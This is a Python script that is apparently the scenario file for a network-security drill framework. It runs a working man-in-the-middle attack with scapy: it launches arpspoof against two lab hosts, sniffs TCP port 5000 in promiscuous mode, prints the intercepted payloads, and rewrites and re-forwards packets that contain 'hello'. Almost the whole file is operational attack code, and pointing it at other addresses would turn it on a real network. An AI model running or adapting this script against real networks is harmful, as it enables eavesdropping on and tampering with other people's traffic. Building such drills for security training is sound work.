"""
scenario entrypoint for mitm.
"""

import sys

from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether
from scapy.packet import Raw, Packet
from scapy.sendrecv import sendp

from nsak.core import DrillManager

import subprocess
import threading
from scapy.all import send, sniff, get_if_hwaddr

ALICE_IP = "10.10.10.20"
BOB_IP = "10.10.10.30"
ATTACKER_IFACE = "eth0"
ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)

def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def disable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")

def print_packet(pkt: Packet):
    if IP in pkt and TCP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        payload = bytes(pkt[TCP].payload)
        if payload:
            try:
                payload = payload.decode(errors="replace")
            except Exception:
                payload = "<binary>"
            print(f"[MITM] {src} → {dst}: {payload}", flush=True)

def manipulate(pkt: Packet):
    if pkt[Ether].src == ATTACKER_MAC:
        # Do not process packets sent by malcom
        return
    # print("[+] Received packet...")
    print_packet(pkt)
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        print("[+] Packet does not contain IP or TCP layer, forwarding...", flush=True)
        return

    if pkt.haslayer(Raw):
        #print("[+] Packet contains raw payload, manipulating...", flush=True)
        payload: bytes = pkt[Raw].load
        #print(f"[+] Raw payload: {payload} ({type(payload)})", flush=True)

        if b"hello" in payload:
            print("[+] Modifying packet", flush=True)

            new_payload = payload.replace(b"hello", b"HELLO")

            pkt[Raw].load = new_payload

            # VERY IMPORTANT: delete checksums & lengths
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum
    else:
        print("[+] Packet does not contain raw payload, forwarding...", flush=True)

    # Forward unmodified packets
    sendp(pkt, iface=ATTACKER_IFACE, verbose=False)

def sniff_packets():
    print("[+] Sniffing traffic...")
    sniff(
        iface=ATTACKER_IFACE,
        filter="tcp port 5000",
        prn=manipulate,
        store=False,
        promisc=True,
    )


def arp_spoof():
    subprocess.Popen(["arpspoof", "-i", ATTACKER_IFACE, "-t", ALICE_IP, BOB_IP])
    subprocess.Popen(["arpspoof", "-i", ATTACKER_IFACE, "-t", BOB_IP, ALICE_IP])


def run() -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """
    #enable_ip_forwarding()
    #iptables_setup()

    disable_ip_forwarding()
    arp_spoof()
    sniff_packets()


if __name__ == "__main__":
    run()
